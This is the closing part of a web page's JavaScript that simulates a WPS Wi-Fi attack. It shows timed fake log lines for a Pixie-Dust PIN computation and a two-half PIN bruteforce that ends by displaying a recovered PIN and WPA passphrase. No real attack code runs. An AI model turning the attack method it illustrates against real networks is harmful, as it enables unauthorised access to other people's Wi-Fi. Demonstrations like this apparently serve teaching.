      append(`<span style="color:var(--accent3)">[Pixie-Dust]</span> Computing PIN offline...`, 2700);
      setTimeout(() => {
        append(`<span style="color:var(--accent2)">[Pixie-Dust]</span> WPS PIN found: <span style="color:var(--accent)">${pin}</span>`, 3200);
        append(`<span style="color:var(--accent2)">[+]</span> WPA PSK: <span style="color:var(--accent2);font-weight:700">${psk}</span>`, 3600);
        append(`<span style="color:var(--text-dim)">[*]</span> Time taken: 0h 0m 3s`, 3900);
        document.getElementById('resultPin').textContent = pin;
        document.getElementById('resultPsk').textContent = psk;
        setTimeout(() => {
          banner.classList.add('show');
          simRunning = false; btn.disabled = false;
        }, 4200);
      }, 0);

    } else {
      // PIN bruteforce simulation
      label.textContent = 'PIN bruteforce progress';
      const total = 11000;
      let tried = 0;
      const half1 = pin.substring(0, 4);

      append(`<span style="color:var(--accent2)">[*]</span> Waiting for beacon from ${bssid}`, 0);
      append(`<span style="color:var(--accent2)">[+]</span> Associated with ${bssid}`, 500);
      append(`<span style="color:var(--text-dim)">[*]</span> Starting PIN bruteforce (max 11,000 guesses)`, 900);
      append(``, 1000);

      // Simulate half 1 search (10,000 guesses compressed to a few log lines)
      const half1Steps = [
        { pct: 10,  delay: 1500,  msg: `[+] Trying half 1 pins 0000–0999...` },
        { pct: 25,  delay: 2500,  msg: `[+] Trying half 1 pins 1000–2499...` },
        { pct: 40,  delay: 3500,  msg: `[+] Trying half 1 pins 2500–3999...` },
        { pct: 60,  delay: 5000,  msg: `[+] Trying half 1 pins 4000–5999...` },
        { pct: 75,  delay: 6500,  msg: `[+] M4 NACK — half 1 wrong, continuing...` },
        { pct: 88,  delay: 7800,  msg: `[+] Trying half 1 pins 7000–8799...` },
      ];

      half1Steps.forEach(s => {
        append(`<span style="color:var(--text-dim)">${s.msg}</span>`, s.delay);
        setTimeout(() => { fill.style.width = s.pct + '%'; pct.textContent = s.pct + '%'; }, s.delay);
      });

      setTimeout(() => {
        fill.style.width = '91%'; pct.textContent = '91%';
        append(`<span style="color:var(--accent2)">[+]</span> M4 OK — half 1 confirmed: ${half1}xxxx`, 9000);
        append(`<span style="color:var(--text-dim)">[*]</span> Bruteforcing half 2 (000–999)...`, 9500);
      }, 9000);

      setTimeout(() => {
        fill.style.width = '97%'; pct.textContent = '97%';
        append(`<span style="color:var(--accent2)">[+]</span> M6 OK — full PIN confirmed!`, 11000);
        append(`<span style="color:var(--accent2)">[+]</span> WPS PIN: <span style="color:var(--accent)">${pin}</span>`, 11400);
        append(`<span style="color:var(--accent2)">[+]</span> WPA PSK: <span style="color:var(--accent2);font-weight:700">${psk}</span>`, 11800);
        fill.style.width = '100%'; pct.textContent = '100%';
        document.getElementById('resultPin').textContent = pin;
        document.getElementById('resultPsk').textContent = psk;
        setTimeout(() => {
          banner.classList.add('show');
          simRunning = false; btn.disabled = false;
        }, 12200);
      }, 0);
    }
  }
</script>
</body>
</html>
